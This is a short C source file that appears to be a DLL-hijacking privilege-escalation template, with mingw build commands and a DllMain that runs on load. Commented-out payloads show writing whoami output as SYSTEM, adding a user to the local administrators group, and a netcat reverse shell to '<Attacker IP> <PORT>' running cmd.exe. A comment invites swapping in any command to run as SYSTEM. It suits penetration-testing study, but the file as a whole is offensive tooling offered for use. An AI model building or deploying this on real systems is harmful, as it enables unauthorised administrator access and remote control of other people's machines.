// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>

BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved) {
    if (dwReason == DLL_PROCESS_ATTACH) {
            // chnage the command to whatever you want to run as SYSTEM, for example, you can add a reverse shell here
            // system("whoami > c:\\windows\\temp\\service.txt");
            
            // system("cmd.exe /k net localgroup administrators user /add");
            
            // or

            // system("C:\Temp\nc.exe <Attacker IP> <PORT> -e cmd.exe");
        ExitProcess(0);
    }
    return TRUE;
}
